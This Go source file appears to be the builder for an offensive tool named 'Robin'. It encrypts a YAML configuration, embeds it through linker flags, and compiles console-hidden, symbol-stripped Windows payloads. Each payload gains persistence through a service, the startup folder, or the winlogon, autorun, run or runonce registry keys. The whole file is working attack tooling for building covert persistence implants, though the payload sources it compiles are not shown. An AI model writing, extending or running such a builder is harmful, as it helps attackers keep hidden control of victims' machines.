package main

import (
	"bytes"
	"encoding/json"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"

	"RobinConfig"

	"github.com/spf13/viper"
)

func buildPayload(payloadType string, config string, exeName string) {
	ldflagVar := fmt.Sprintf("-X main.robin=%s -w -s -H=windowsgui", config)
	outputVar := filepath.FromSlash(fmt.Sprintf("../output/%s", exeName))
	payloadFinal := fmt.Sprintf("%s.go", payloadType)
	err := os.Chdir("pkgs")
	os.Setenv("GOOS", "windows")
	if err != nil {
		fmt.Println("[-] 'pkgs' directory does not exist. Make sure this directory containing the payload files exist in the same directory as the builder executable.")
		os.Exit(1)
	}
	cmd := exec.Command("go", "build", "-ldflags", ldflagVar, "-o", outputVar, payloadFinal)
	var stderr bytes.Buffer
	cmd.Stderr = &stderr
	err = cmd.Run()
	if err != nil {
		fmt.Println(stderr)
	} else {
		fmt.Printf("[+] Payload build successful! File \"%s\" created in output directory.\n", exeName)
	}
	os.Chdir("..")
	os.Remove(filepath.FromSlash("pkgs/encrypt.txt"))
}

func createEncryptedPayload(configPayload []byte, encryptionKey string) string {
	encryptedConfig := encryptConfig(configPayload, encryptionKey)
	writeEncryptKey(encryptionKey)
	return encryptedConfig
}

func writeEncryptKey(key string) {
	f, _ := os.Create("pkgs/encrypt.txt")
	defer f.Close()

	f.WriteString(key)
	f.Sync()
}

func createServicePayload(config RobinConfig.ServiceConfig, key string) string {
	jsonConfig, _ := json.Marshal(config)
	encPayload := createEncryptedPayload(jsonConfig, key)
	return encPayload
}

func createStartupPayload(config RobinConfig.StartupConfig, key string) string {
	jsonConfig, _ := json.Marshal(config)
	encPayload := createEncryptedPayload(jsonConfig, key)
	return encPayload
}

func createRegistryPayload(config RobinConfig.RegistryConfig, key string) string {
	jsonConfig, _ := json.Marshal(config)
	encPayload := createEncryptedPayload(jsonConfig, key)
	return encPayload
}

func main() {
	fmt.Println(headerString)
	viper.SetConfigName("config")
	viper.SetConfigType("yml")
	viper.AddConfigPath("./config/")

	var configuration RobinConfig.Configurations
	var encryptedConfig string

	err := viper.ReadInConfig()
	if err != nil {
		fmt.Printf("[-] Unable to read config file. Error: %v", err)
		os.Exit(1)
	}

	err = viper.Unmarshal(&configuration)
	if err != nil {
		fmt.Printf("[-] Unable to decode configuration. Error:  %v", err)
		os.Exit(1)
	}

	if configuration.Technique == "service" {
		encryptedConfig = createServicePayload(configuration.Service, configuration.EncryptKey)
		buildPayload("service", encryptedConfig, configuration.Name)
	} else if configuration.Technique == "startup" {
		encryptedConfig = createStartupPayload(configuration.Startup, configuration.EncryptKey)
		buildPayload("startup", encryptedConfig, configuration.Name)
	} else if configuration.Technique == "registry" {
		encryptedConfig = createRegistryPayload(configuration.Registry, configuration.EncryptKey)
		regKey := viper.Get("registry.key")
		regHive := viper.Get("registry.hive")
		if regHive != "HKLM" && regHive != "HKCU" {
			fmt.Println("[*] Unknown Registry hive specified in config file. Payloads will default to HKCU where applicable. Possible Options: HKCU, HKLM.")
		}
		if regKey == "winlogon" {
			buildPayload("winlogon", encryptedConfig, configuration.Name)
		} else if regKey == "autorun" {
			buildPayload("autorun", encryptedConfig, configuration.Name)
		} else if regKey == "run" {
			buildPayload("run", encryptedConfig, configuration.Name)
		} else if regKey == "runonce" {
			buildPayload("runonce", encryptedConfig, configuration.Name)
		} else {
			fmt.Println("[-] Unknown Registry option specified in config file. Possible Options: winlogon, autorun, run, runonce.")
			os.Remove(filepath.FromSlash("pkgs/encrypt.txt"))
		}
	} else {
		fmt.Println("[-] Unknown technique specified in config file. Possible Options: service, startup, registry.")
	}
}
